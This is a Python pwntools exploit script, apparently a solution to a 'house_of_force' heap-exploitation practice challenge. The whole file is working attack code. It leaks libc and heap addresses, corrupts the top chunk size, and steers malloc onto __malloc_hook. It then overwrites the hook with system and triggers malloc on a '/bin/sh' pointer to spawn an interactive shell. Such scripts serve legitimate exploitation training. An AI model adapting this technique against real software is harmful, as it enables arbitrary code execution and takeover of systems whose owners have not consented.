#!/home/gh0st69/.venv/bin/python
import os
from pwn import *

elf = context.binary = ELF("house_of_force")
context.terminal = ["tmux", "splitw", "-h"]
libc = elf.libc

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

log.info(f"heap: 0x{heap:02x}")

log.info(f"target: 0x{elf.sym.target:02x}")

malloc(24, b"Y"*24 + p64(0xffffffffffffffff))

log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")

# distance = delta(heap + 0x20 , elf.sym.target - 0x20)

distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)

log.info(f'distance: 0x{distance:02x}')

malloc(distance, "/bin/sh\0")

malloc(24, p64(libc.sym.system))

cmd = heap + 0x30

malloc(cmd, "")

io.interactive()